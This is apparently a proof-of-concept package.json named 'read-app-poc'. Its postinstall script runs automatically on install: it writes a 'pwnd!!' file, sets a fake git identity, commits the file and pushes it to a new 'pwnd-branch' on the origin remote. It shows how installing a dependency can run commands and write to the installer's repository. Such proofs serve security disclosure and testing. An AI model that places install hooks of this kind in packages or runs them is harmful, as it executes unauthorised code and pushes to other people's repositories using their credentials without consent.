{
  "name": "read-app-poc",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "echo 'pwnd!!' > poc.txt && git config user.email \"MeowonKolam@example.com\" && git config user.name \"Pwn-by-w3shi\" && git add poc.txt && git commit -m 'POC: pwnd!' && git push origin HEAD:refs/heads/pwnd-branch"
  }
}

